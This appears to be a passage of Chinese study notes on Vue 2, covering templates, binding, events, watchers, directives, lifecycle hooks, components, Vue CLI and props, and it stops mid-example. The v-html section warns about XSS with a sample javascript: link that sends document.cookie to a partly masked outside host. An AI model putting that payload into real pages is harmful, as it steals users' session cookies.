



[表单输入绑定 — Vue.js 中文文档 (bootcss.com)](https://vuejs.bootcss.com/guide/forms.html)

## 使用vue插件

[GitHub - vuejs/devtools: ⚙️ Browser devtools extension for debugging Vue.js applications.](https://github.com/vuejs/devtools)

## 关闭生成环境Tip

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202112191550766.png" alt="image-20211219155006661" style="zoom:80%;" />

> :no_entry: 此笔记适用于`vue 2.x` ！！！

# vue核心

## helloworld

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src=https://cn.vuejs.org/js/vue.js></script>
</head>
<body>
    <div id="main">
        <h2>{{name}}</h2>
    </div>
    <script>
        Vue.config.productionTip = false;
        new Vue({
            el:'#main',
            data:{
                name:'胡梓卓'
            }
        })
    </script>                                                                                                                  
</body>
</html>
```

## 模板语法

### 插值语法

解析标签体内容，可读取data中的所有属性

> 插值表达式{{js表达式}} 也可以写vue实例上所有的
>
> :warning: 一个Vue实例只能接管一个容器
>
> + 如果有多个容器，只对第一个有效
> + 如果有多个实例，只对第一个vue实例生效

### 指令语法

解析标签（标签属性、标签体内容、绑定事件...）

```vue
<div id="main">
        <h2>{{name}}</h2>
        <a v-bind:href="jsInit.url">vuejs文件</a>
        <!-- 简写 -->
        <a :href="jsInit.url">vuejs文件</a>
    </div>
<script>
        Vue.config.productionTip = false;
        new Vue({
            el:'#main',
            data:{
                jsInit:{
                    url:'https://cn.vuejs.org/js/vue.js'
                },
                name:'胡梓卓'
            }
        })
    </script>
```

## 数据绑定

```vue
<!-- 单向数据绑定 -->
        <input type="button" v-bind:value="name">
        <input type="button" :value="name">
        <br>
        <!-- 双向数据绑定 -->
        <input type="button" v-model:value="name">
        <input type="button" v-model="name">
```

> v-bind 数据只能从data流向页面
>
> v-model一般只用于表单元素(input、select)

## el与data的两种写法

```vue
<script>
      Vue.config.productionTip = false;
      const v = new Vue({
        // el:'#main',
        // data:{
        //     jsInit:{
        //         url:'https://cn.vuejs.org/js/vue.js'
        //     },
        //     name:'胡梓卓'
        // }
        data: function () {
          return {
            jsInit: {
              url: "https://cn.vuejs.org/js/vue.js",
            },
            name: "胡梓卓"
          };
        },
      });
      v.$mount("#main");
    </script>
```

## MVVM

> m 模型
>
> v 视图
>
> vm 视图模型 数据绑定 dom监听

## 数据代理

```js
Object.defineProperties
```

```js
let number = 18;
      let person = {
        name: "胡梓卓",
        sex: "男",
      };
      Object.defineProperty(person, 'age', {
        value: 21,
        enumerable: true, //枚举，默认false
        writable: true, //可修改，默认false
        configurable: true, //可删除，默认false

        get: function () {
          return number;
        },
        set(value) {
          number = value;
        }
      });
```

> <u>通过vm对象来代理data对象中的属性的操作（get/set）</u>
>
> **基本原理**：通过Object.defineProperty()把data对象中的所有属性添加到vm上，并添加getter/setter，
>
> 在getter/setter内部去操作

## 事件处理

```vue
使用v-xxx / @xxx 绑定事件
事件的回调函数需要配置在methods中，会绑定在vue实例对象上
普通函数的this指向vue实例对象
@click="demo" @click="demo($event,params,...)" $event会把事件对象传过去
```

```vue
      <!-- 事件处理 -->
      <input type="button" value="点击提示" @click="tip($event)" />
<script>
      Vue.config.productionTip = false;
      const v = new Vue({
        methods: {
          tip(event) {
            console.log(event.target);
          },
        },
      });
    </script>
```

## 事件修饰符

### .prevent

> 阻止默认事件

```vue
<input type="button" value="点击提示" @click.prevent="tip($event)" />
<script>
	new Vue({
        tip(e){
            e.preventDefault();
        }
    });
</script>
```

### .stop

> 阻止事件冒泡

```vue
      <div @click="demo">
        <input type="button" @click.stop="demo($event)"/>
      </div>
<script>
	new Vue({
        demo(e){
            e.stopPropagation();
          }
    });
</script>
```

### .once

> 事件只触发一次

### .capture

> 使用事件的捕获方式,在**捕获阶段**就处理事件

### .self

> 只有event.target是当前操作的元素才触发事件
>
> <u>冒泡触发的target永远都是哪个触发的元素</u>
>
> 只有操作的是谁才触发，可用于阻止冒泡

### .passive

> 事件的默认行为立即执行，无需等待回调函数执行完成
>
> ```vue
> @scroll 页面滚动 先执行滚动条滚动，再执行回调函数
> 	滚动条到底，不会触发
> @whell 鼠标滚轮滚动 先执行回调函数，再执行滚动条滚动
> 	只要滚轮滚动就出触发
> ```

可链式写法 .stop.prevent

## 键盘事件

```vue
@keydown
@keypress
@keyup
(1)
	.enter .13
	.delete 删除键和退格键
	.esc
	.space
	.tab 需要配合@keydown使用，因为按下就切换走了
	.up	上
	.down 下
	.left 左
	.right 右
(2)
	ctrl,alt,shift.win(meta)
	@keyup 系统修饰键 + xxx ,释放xxx后，才触发
	@keydown 正常触发
(3)
keyCode
(4)
key
(5)
<input type="text" value="enter" @keydown.hz="tip($event)" />
<script>
Vue.config.keyCodes = {
    "kebab-case": 179,
    "hz": 13,
};
if(event.key=="Enter"){
      console.log(event.key); //Enter
}
</script>
.caps-lock 切换大小写 两个单词（命令首字母小写，加“-”）

//////////////////////////////////
.ctrl.y 按下ctrl+y
```

## 计算属性

```html
<div id="root">
      <input type="text" name="" id="" v-model:value="v1" />
      <br />
      <input type="text" name="" id="" v-model:value="v2" />
      <div>{{v1}}{{v2}}</div>
      <div>{{fullName()}}</div>
    </div>
<script>
    new Vue({
      el: "#root",
      data: {
        v1: 1,
        v2: 2,
      },
      methods: {
        fullName() {
          return this.v1 + "-" + this.v2;
        },
      },
    });
  </script>
```

计算属性，有缓存

get()

+ 初次读取
+ 所依赖的数据发生变化

```html
<div id="root">
      <input type="text" name="" id="" v-model:value="v1" />
      <br />
      <input type="text" name="" id="" v-model:value="v2" />
      <div>{{full_Name}}</div>
    </div>
<script>
    computed: {
        full_Name: {
          get() {
            console.log("get被调用");
            return this.v1 + "-" + this.v2;
          },
          //vm.full_name='里-斯'
          set(value) {
            let arr = value.split("-");
            this.v1 = arr[0];
            this.v2 = arr[1];
          },
        },
</script>
```

计算属性会出现的vue实例上，即为一个属性，值是计算出来的

#### 简写

> 不考虑修改，只展示

```html
<script>
    computed: /*{
        full_Name:function(){
            console.log("get被调用");
            return this.v1 + "-" + this.v2;
        }*/
        full_name(){
            console.log("get被调用");
            return this.v1 + "-" + this.v2;
        }
  }
</script>
```

## 监视属性

> 监视属性必须存在才能监视
>
> (1) new Vue时传入watch配置
>
> (2) 通过vm.$watch监视

```html
<script>
   const vm = new Vue({
      el: "#main",
      data: {
        flag: false,
      },
      methods: {
        changeWeather() {
          this.flag = !this.flag;
        }
      },
      computed: {
        
      },
       //(1)
      watch: {
        flag: {
          immediate: true, //初始化时加载handler
          handler(newValue, oldValue) {
            console.log("falg被修改了", newValue, oldValue);
          },
        },
      },
    });
    //(2)
    vm.$watch("flag", {
      immediate: true, //初始化时加载handler
      handler(newValue, oldValue) {
        console.log("flag被修改了", newValue, oldValue);
      },
    });
  </script>
```

### 深度监视

> vue中的watch默认不监测对象内部值的改变
>
> 配置`deep:true`可以监测对象内部值改变

```html
<script>
    const vm = new Vue({
      el: "#main",
      data: {
        flag: false,
        number: {
          a: 1,
          b: 2,
        },
      },
      watch: {
        "number": {
          deep:true, //深度监视
          handler(newValue,oldValue) {
            console.log("number里面的a被修改了", newValue, oldValue);
          },
        },
      },
    });
  </script>
```

### 监视简写

> 不需要配置其他属性如immediate,deep时，使用

```js
watch: {
number(newValue,oldValue){
          console.log("number里面的a被修改了", newValue, oldValue);
        }
}
vm.$watch('flag',function(){
      console.log("flag被修改了", newValue, oldValue);
    })
```

## watch与computed的区别

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202112292130387.png" alt="image-20211229213007245" style="zoom:80%;" />



## 绑定class样式

> (1) `字符串`写法，:class(v-bind:class)="字符串" 样式的类名不确认，需要动态指定
>
> (2) `数组`写法，要绑定的样式数量不确定，名字也不确定
>
> ```html
> <div :class="arr"></div>
> data:{
>     arr:['className1','className2']
> }
> ```
>
> (3) `对象`写法，数量，类名相同，动态确定
>
> ```html
> <div :class="obj"></div>
> data:{
> 	obj:{
> 		className1false,
> 		className2true
> 	}
> }
> }
> ```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202112302227752.png" alt="image-20211230222709222" style="zoom:80%;" />

## 绑定style样式

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202112302227641.png" alt="image-20211230222746668" style="zoom:80%;" />

> :style(v-bind:style)
>
> + 对象写法 :style="{fontSize:xxx}" xxx是动态值
>
> + 数组写法 :style="[a,b]" a,b是<u>样式对象</u>
>
>   **样式对象：**
>
>   <img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202112302226467.png" alt="image-20211230222623754" style="zoom:80%;" />

## 条件渲染

> `v-show`=xxx `display:none`隐藏样式（xxx为布尔值）
>
> `v-if`=xxx 删除结点,**不展示的dom被移除**。适用于切换频率较低的场景
>
> `v-else-if`=xxx
>
> `v-else`=xxx

```vue
<template v-if="i==1">
     <h2>我的</h2>
     <h2>爱</h2>
     <h2>好</h2>
</template>
```

## 列表渲染

> `v-for`
> 展示列表数据
> v-for="(item,index) in xxx" :key="index"
> 可遍历数组，对象，字符串，指定次数

 ```vue
 <ul>
         <li>遍历数组</li>
         <li v-for="(item, value) in arr" :key="value">
             姓名：{{item.sname}}，年龄：{{item.age}}
         </li>
         <li>遍历对象</li>
         <li v-for="(val, name) in object" :key="name">
             {{name}}:{{val}}
         </li>
         <li>遍历字符串</li>
         <li v-for="(element, index) in str" :key="index">
             {{index}}:{{element}}
         </li>
         <li>遍历指定次数</li>
         <li v-for="(number, inx) in 6" :key="inx">
             {{inx}}:{{number}}
         </li>
     </ul>
 ```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201032147953.png" alt="image-20220103214659565" style="zoom:80%;" />

### key作用与原理

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201032214054.png" alt="image-20220103221441441" style="zoom:80%;" />

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201032218974.png" alt="image-20220103221758075" style="zoom:80%;" />

### key的原理

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201032221122.png" alt="image-20220103222148681" style="zoom:80%;" />

### 列表过滤

> "asdsf" 使用 ""（空字符串）indexOf 返回`0`

```vue
<div id="root">
    <ul>
        <input type="text" placeholder="请输入要查询的数据。。。" v-model="keyWord"/>
        <li v-for="(item,index) in filterPersons">
            姓名：{{item.name}}--性别：{{item.sex}}--年龄：{{item.age}}
        </li>
    </ul>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            persons: [
                {id: '001', name: '马冬梅', sex: '女', age: '18'},
                {id: '002', name: '周冬雨', sex: '女', age: '19'},
                {id: '003', name: '周杰伦', sex: '男', age: '20'},
                {id: '004', name: '温兆伦', sex: '男', age: '21'}
            ],
            filterPersons: []
        },
        method: {},
        watch: {
            keyWord: {
                immediate: true,
                handler(val) {
                    this.filterPersons = this.persons.filter((p) => {
                        return p.name.indexOf(val) !== -1;
                    })
                }
            }
        },
        computed: {
            // filterPersons() {
            //     return this.persons.filter((p) => {
            //         return p.name.indexOf(this.keyWord) !== -1;
            //     })
            // }
        }
    });
</script>
```

### 列表排序

```vue
<div id="root">
    <ul>
        <input type="text" placeholder="请输入要查询的数据。。。" v-model="keyWord"/>
        <input type="button" @click="sortType=0" value="原顺序"/>
        <input type="button" @click="sortType=1" value="升序"/>
        <input type="button" @click="sortType=2" value="降序"/>
        <li v-for="(item,index) in filterPersons">
            姓名：{{item.name}}--性别：{{item.sex}}--年龄：{{item.age}}
        </li>
    </ul>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            keyWord: '',
            sortType: '',
            persons: [
                {id: '001', name: '马冬梅', sex: '女', age: '23'},
                {id: '002', name: '周冬雨', sex: '女', age: '35'},
                {id: '003', name: '周杰伦', sex: '男', age: '34'},
                {id: '004', name: '温兆伦', sex: '男', age: '21'}
            ],
            // filterPersons: []
        },
        method: {},
        watch: {
            // keyWord: {
            //     immediate: true,
            //     handler(val) {
            //         this.filterPersons = this.persons.filter((p) => {
            //             return p.name.indexOf(val) !== -1;
            //         }).sort((a, b) => {
            //
            //         })
            //     }
            // }
        },
        computed: {
            filterPersons() {
                const arr = this.persons.filter((p) => {
                    return p.name.indexOf(this.keyWord) !== -1;
                });
                if (this.sortType !== 0) {
                    arr.sort((o1, o2) => {
                        return this.sortType === 1 ? o1.age - o2.age : o2.age - o1.age;
                    })
                }
                return arr;
            }
        }
    });
</script>
```

## vue检测数据的原理

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201042157082.png" alt="image-20220104215723138" style="zoom:80%;" />

> + vue会监视data中所有层次的数据

### 对象里面的数据改变

通过setter实现监视，且要在new Vue时就传入要检测的数据

1. 对象中后追加的属性，Vue默认不做响应式处理

2. 如果需要后添加的属性为响应式

   ```js
   Vue.set(target,propertyName/index,value)
   vm.$set(target,propertyName/index,value)
   ```

### 数组里面的数据改变

通过包裹数组更新元素的方法实现

1. 调用原生对应的方法对数组进行更新
2. 重新解析模板，进而更新页面

#### 修改数组元素

```js
使用push(),shift(),unshift(),splice(),sort(),reverse()
Vue.set(),vm.$set()
```

> **Vue.set(),vm.$set() 不能给vm或vm的根数据对象添加属性**

## 收集表单数据

```html
<input type="text"> v-model收集value值

<input type="radio">  v-model收集value值

<input type="checkbox">
没有配置value属性，收集的就是checked（布尔值）
配置value属性
（1）v-model的初始值是非数组，收集的就是checked（布尔值）
（2）v-model的初始值是数组，收集的就是value组成的数组
```

### 修饰符

```js
（1）v-model.lazy 失去焦点再收集数据
（2）v-model.number 输入字符串转化为有效的数字，一般配合type="number"使用
使用type="text"输入12df44，收集12
（3）v-model.trim 去除首尾空格
```

## ~~过滤器~~:x:

> :no_entry_sign: 从 Vue 3.0 开始，过滤器已移除，且不再支持

1. 注册过滤器 Vue.filter(name,callback) 或 new Vue{filters:{}}
2. 使用过滤器 {{xxx | 过滤器名}} 或 v-bind:属性 = "xxx | 过滤器名"

+ 可接收额外参数，多个过滤器可串联使用

+ 不改变原始数据

```js
<h2>局部过滤器</h2>
    <h2>现在时间：{{date | fmtDate}}</h2>
    <h2>现在时间：{{date | fmtDate('YYYY年MM月DD日')}}</h2>
    <h2>现在时间：{{date | fmtDate('YYYY年MM月DD日') | strSlice}}</h2>
    <h2 v-bind:data-strSlice="date | strSlice">现在时间：{{date | fmtDate('YYYY年MM月DD日') | strSlice}}</h2>
    <script>
        // 全局过滤器
        Vue.filter('strSlice', function (value) {
                return (value+'').slice(0, 4);
            }
        )
        new Vue({
            el: '#root',
            data: {
                date: Date.now()
            },
            method: {},
            watch: {},
            computed: {},
            filters: {
                fmtDate(value, params = 'YYYY-MM-DD HH:mm:ss') {
                    return dayjs().format(params);
                },
                // strSlice(value) {
                //     return value.slice(0, 4);
                // }
            }
        });
    </script>
```

## 内置指令

### v-text 指令

> 向其所在的节点中**渲染文本内容**
>

与插值语法的区别：v-text会**替换节点中的内容**,{{xx}}不会

### v-html

> 向指定节点中渲染包含**html结构**的内容

安全性问题！！！注意XSS攻击

```html
<a href=javascript:location.href="http://152.??.com?"+document.cookie>XXX</a>
```

`HttpOnly属性`：只能http协议能够携带获取

### v-cloak

> **Vue实例创建完毕并接管容器后，会删除v-cloak属性**
>
> 配置css可解决网速慢页面展示{{xx}}的问题

```html
属性选择器
[v-cloak]{
	display:none
}
<div v-cloak>{{name}}</div>
```

### v-once

> **v-once所在节点在初次动态渲染后，视为静态资源**
>
> 以后数据不会更新

```html
<div v-once>{{n}}</div>
```

### v-pre

> **跳过所在节点的编译过程**
>
> 跳过没有使用指令和插值语法的节点，加快编译

## 自定义指令

### 局部指令

```vue
<span v-big-number="n"></span>
<script>
    directives: {
        		xx(element, binding){},
                xx:function (element, binding){
                  //不包含inserted
                },
                'xx-xx':{
                    //指令与元素成功绑定
                    bind(element,binding){

                    },
                    //指令所在元素被插入页面
                    inserted(element,binding){
						binding.focus();//自动获取焦点
                    },
                    //指令所在模板被重新解析
                    update(element,binding){

                    }
                }
            }
    </script>
```

### 全局指令

```vue
<script>
    Vue.directive('xx-xx',{});
	Vue.directive('xx-xx',function (element,binding){});
</script>
```



<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201102140108.png" alt="image-20220110214027981" style="zoom:80%;" />

什么时候调用此指令？

1. 指令与元素成功绑定
2. 指定所在模板被重新解析

`注意`：

+ 指令定义不加**v-**，使用时加

+ case命名使用kebab-case形式。不能使用camelCase
+ this作用域为`window`

## 生命周期

生命周期函数的this指向**vue实例**或**组件实例对象**

```vue
<script>
    new Vue({
      //vue模板解析完成并把初始的真实DOM元素放入页面后，执行
	mounted(){}  
    })
</script>
```

### `创建-挂载-更新-销毁`流程

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201112215165.png" alt="image-20220111221542241" style="zoom:80%;" />



<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201112150055.png" style="zoom:80%;" />

```vue
vue2.x 模板必须包含一个根节点，vue3.x已解决
<script>
new Vue({
            el: '#root',
            template: `
                 <div>
                  <h2></h2>
                  <div></div>
                 </div>
                `,
</script>
```

> **注意：**
>
> 销毁解绑的是`自定义事件`，绑定的dom事件有效，如click
>
> 执行``beforeDestory`时，**数据发送变化，不会触发页面更新**

```html
两个不同作用域要使用同一个变量，可使用this关键字挂到当前实例上
文字透明度改变a
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Document</title>
    <script src="https://cn.vuejs.org/js/vue.js"></script>
</head>
<body>
<div id="root">
    <h2 v-bind:style="{opacity}">胡梓卓</h2>
    <button @click="stopTime()">点击停止</button>
    <button @click="opacity = 1">点击透明度=1</button>
    <button @click="destoryVue()">销毁vue</button>
</div>
<script>
    new Vue({
        el: '#root',
        data: {
            opacity: 1
        },
        methods: {
            destoryVue() {
                this.$destroy();
            },
            stopTime() {
                clearInterval(this.timer);
            }
        },
        watch: {},
        computed: {},
        filters: {},
        directives: {},
        mounted() {
            this.timer = setInterval(() => {
                this.opacity -= 0.01;
                if (this.opacity < 0) {
                    this.opacity = 1;
                }
            }, 16)
        },
        beforeDestroy() {
            console.log("vue实例即将被销毁");
            clearInterval(this.timer);
        }
    });
</script>
</div>
</body>
</html>
```



# vue组件化编程

## 组件

实现局部功能的代码和资源的集合



## 非单文件组件

> 1.定义组件（创建组件）
>
> 2.注册组件
>
> 3.使用组件（写组件标签）

### 定义

使用``Vue.extend(options)``创建，其中options和new Vue(options)时传入的有点区别

 1. **el不写**。最终所有的组件要经过vm的管理，有vm中的el决定哪个容器
 2. **data必须写成函数**。避免组件复用时，数据存在引用关系
 使用template配置组件结构

### 注册

局部注册：new Vue时传入`components`选项

全局注册：使用`Vue.component('组件名','组件')`

### 编写组件标签

```vue
<school></school>
```

```vue
<body>
<div id="root">
    <!--    使用组件-->
    <employee></employee>
    <hr>
    <department></department>
</div>
</body>
<script>
    //定义组件
    const employee = Vue.extend({
        template: `
          <div>
          <h2>{{ name }}</h2>
          <h2>{{ age }}</h2>
          <button @click="showName">点击提示姓名</button>
          </div>
        `,
        data() {
            return {
                name: '胡梓卓',
                age: 18
            }
        },
        methods: {
            showName() {
                alert(this.name);
            }
        }
    });
    const department = Vue.extend({
        template: `
          <div>
          <h2>{{ name }}</h2>
          <h2>{{ numberOfPeople }}</h2>
          <button @click="showName">点击提示部门名称</button>
          </div>
        `,
        data() {
            return {
                name: '智能制造部',
                numberOfPeople: 203
            }
        },
        methods: {
            showName() {
                alert(this.name);
            }
        }
    });
    new Vue({
        el: '#root',
        //注册组件
        components: {
            employee: employee,
            department: department
        },
        data: {},
        method: {},
        computed: {},
        watch: {},
        filters: {},
        directives: {}
    });
</script>
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201122134138.png" alt="image-20220112213414805" style="zoom:80%;" />



### 注意点:warning:

#### 组件名

一个单词组成：

​	（首字母小写）：school

​	（首字母大写）：School

多个单词组成：

​	（kebab-case）：my-school

​	（CamelCase）：MySchool

注意：

（1）组件名不要写成html中已有的元素名称

（2）可以使用name配置向指定组件在开发者工具中呈现的名字(第三方组件库)



#### 组件标签

```vue
<school></school>
<school/>
```

不能使用脚手架时，`<school/>`会导致后续组件不能渲染

#### 声明组件简写

```vue
const school = Vue.extend({options}) => const school = {options}
```

### 组件嵌套

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Document</title>
    <script src="https://cn.vuejs.org/js/vue.js"></script>
</head>
<body>
<div id="root">
    <app></app>
</div>
</body>
<script>
    const student = Vue.extend({
        name: 'student',
        data() {
            return {
                name: '涂鏊飞',
                age: 22
            }
        },
        template: `
          <div>
          <h2>{{ name }}</h2>
          <h2>{{ age }}</h2>
          </div>
        `,
        components: {}
    });
    const hello = Vue.extend({
        name: 'hello',
        template: `
        <h1>介绍</h1>
      `
    });
    const school = Vue.extend({
        name: 'school',
        data() {
            return {
                name: '湖北工程学院',
                adress: '湖北孝感'
            }
        },
        template: `
          <div>
          <div>
            <h2>{{ name }}</h2>
            <h2>{{ adress }}</h2>
          </div>
          <student></student>
          </div>
        `,
        //注册子组件，模板包含student，外部要包含一个根节点
        components: {
            student
        }
    });
    const app = Vue.extend({
        name: 'app',
        template: `
          <div>
          <hello></hello>
          <school></school>
          </div>
        `,
        //管理school和hello
        components: {
            school, hello
        }
    });
    new Vue({
        el: '#root',
        components: {
            app
        },
        data: {},
        method: {},
        computed: {},
        watch: {},
        filters: {},
        directives: {}
    });
</script>
</html>
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201132032520.png" alt="image-20220113203249371" style="zoom:80%;" />

## VueComponent构造函数

1. school組件本质是一个VueComponent的构造函数

2. Vue解析时，会帮我们创建school的组件实例对象，即执行new VueComponent(options)
3. `每次调用Vue.extend，返回的是全新的VueComponent组件实例对象`
4. 关于this指向

```js
(1)组件配置中：
	data,methods,watch,comptued指向【VueComponent组件实例对象】，简称vc
(2)new Vue(options)配置中：
    data,methods,watch,comptued指向【Vue实例对象】
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201132109292.png" alt="image-20220113210933616" style="zoom:80%;" />

### vue实例与组件实例

组件是可复用的 Vue 实例，所以它们与 `new Vue` 接收相同的选项，例如 `data`、`computed`、`watch`、`methods` 以及生命周期钩子等。仅有的例外是像 `el` 这样根实例特有的选项。

### 内置关系

#### 原型链

```js
function Demo() {
        this.a = 1999;
        this.b = 2000;
    }
    const d = new Demo();
    console.log(d.__proto__);
    console.log(Demo.prototype === d.__proto__);
    Demo.prototype.c = 2022;
    console.log(d.c);
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201132125803.png" alt="image-20220113212458368" style="zoom:80%;" />

> ```js
> (VueComponent.prototype.__proto__ === Vue.prototype
> ```

```vue
const app = Vue.extend({});
console.log(app.prototype.__proto__ === Vue.prototype) //true
```

**让组件实例对象可以访问到vue原型上的属性和方法**

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201132142296.png" alt="image-20220113214210545" style="zoom:80%;" />



## 单文件组件

> :warning:main.js导入``import App from './App.vue'`需要在脚手架环境运行！！！
>
> `Uncaught SyntaxError: Cannot use import statement outside a module`

### School.vue

```vue
<template>
  <div>
    <h2>学校名称：{{ name }}</h2>
    <h2>学校地址：{{ address }}</h2>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: '湖北工程学院',
      address: '湖北省孝感市'
    }
  }
}
</script>

<style scoped>
h2 {
  color: #0dff1d;
}
</style>
```

### Student.vue

```vue
<template>
  <div>
    <h2>学生姓名：{{ name }}</h2>
    <h2>学生年龄：{{ age }}</h2>
  </div>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: '涂鏊飞',
      age: '22'
    }
  }
}
</script>

<style scoped>
h2 {
  color: #1c036c;
  font-weight: 700;
}
</style>
```

### App.vue

```vue
<template>
  <div>
    <school></school>
    <student></student>
  </div>
</template>

<script>
import School from './School'
import Student from './Student'

export default {
  name: "App",
  components: {
    Student, School
  }
}
</script>
```

### main.js

```js
import App from './App.vue'

new Vue({
    el: '#root',
    components: {
        App
    },
    template: `<app></app>`
})
```

### index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>单文件组件</title>
</head>
<body>
<div id="root">
</div>
</body>
<script src="https://cn.vuejs.org/js/vue.js"></script>
<script src="./main.js"></script>
</html>
```

# 使用vue脚手架

## npm全局安装

```powershell
切换淘宝npm镜像
npm config set registry https://registry.npm.taobao.org

全局安装
npm install -g @vue/cli
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201182056241.png" alt="image-20220118205555410" style="zoom:80%;" />

```powershell
切换到要创建的目录
vue create xxx
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201182058974.png" alt="image-20220118205841228" style="zoom:80%;" />

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201182107400.png" alt="image-20220118210735858" style="zoom:80%;" />

```powershell
启动项目
npm run serve
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201182109550.png" alt="image-20220118210930741" style="zoom:80%;" />

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201182109878.png" alt="image-20220118210955378" style="zoom:80%;" />

## vue脚手架结构

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201182215086.png" alt="image-20220118221548669" style="zoom:80%;" />

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201192033240.png" alt="image-20220119203348202" style="zoom:80%;" />

> 加入School和Student组件到components目录下
>
> 修改App.vue
>
> 修改main.js。注册app组件，加入template
>
> 运行npm run serve

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201182219098.png" alt="image-20220118221856055" style="zoom:80%;" />

## render函数

> vue.js与vue.runtime.xxx.js的区别
>
> （1）vue.js是完整版的vue，包含：核心功能+模板解析器
>
> （2）vue.runtime.xxx.js是运行版的vue，只包含：核心功能，没有模板解析器
>
> 没有模板解析器不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容

### main.js

```js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
    /*
    render(createElement){
        return createElement('h2','helloworld');
    }
    */
    render: h => h(App),
}).$mount('#app')
```

### index.html

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
  </body>
</html>
```

## 修改默认配置

> vue脚手架隐藏了所有webpack配置，使用
>
> ```powershell
> vue inspect > output.js
> ```

使用vue.config.js对脚手架进行个性化定制，[配置参考 | Vue CLI (vuejs.org)](https://cli.vuejs.org/zh/config/#lintonsave)

```js
module.exports = {
    pages: {
        index: {
            // page 的入口
            entry: 'src/main.js',
        },
    },
    lintOnSave:false
}
```

## ref属性

> 用来给元素或子组件注册引用信息（id的替代者）
>
> 应用在html标签上获取的是真实Dom元素，应用在组件标签上是组件实例对象（vc）
>
> ```html
> 使用方式
> 标识 <h1 ref="xxx"></h1> 或 <School ref="xxx"></School>
> 获取：this.$refs.xxx
> ```

```js
<Student ref="Stu"></Student>
<button @click="showDom" ref="btn">点击打印元素或组件</button>
methods:{
    showDom(){
      console.log(this.$refs.Stu) //组件实例对象
      console.log(this.$refs.btn) //真实dom元素
    }
  }
```

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201192104886.png" alt="image-20220119210406126" style="zoom:80%;" />

<img src="https://note-1259190304.cos.ap-chengdu.myqcloud.com/note/202201192103685.png" alt="image-20220119210332249" style="zoom:80%;" />

## props配置

> 让组件接收外部传过来的数据

(1)传递数据

```html
<School :no="211" name="武汉纺织大学"></School>
```

(2)接收数据

```js
//（1）只接收
props:['no','name','address']

//（2）限制类型
props:{
    no:Number,
    name:String,
    address:String
}

//（3）限制类型，必要性，默认值
props:{
    no:{
      type:Number,
      required:false,
      default:999
    },
    name:{
      type:String,
      required: true
    },
    address:{
      type:String,
      required:false,
      default: '未知'
    }
}
```

> :warning:props是只读的，vue底层会监测你对props的修改，如果进行修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到新的变量在data中，去进行修改

### Shcool.vue

```vue
<template>
  <div>
    <h2>编号：{{ CurrentNo }}</h2>
    <h2>学校名称：{{ name }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="CurrentNo++">点我编号+1</button>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      CurrentNo : this.no
    }
  },
  // props:['no','name','address']
  /*props:{
    no:Number,
    name:String,
    address:String
  },*/
  props:{
    no:{
      type:Number,
      required:false,
      default:999
    },
    name:{
      type:String,
      required: true
    },
    address:{
      type:String,
      required:false,
      default: '未知'
    }
  }
}
</script>

<style scoped>
h2 {
  color: #0dff1d;
}
</style>
```

### app.vue

```vue
<template>
  <div>
    <School :no="211" name="武汉纺织大学"></School>
  </div>
</template>
<script>
import School from './components/School'
export default {
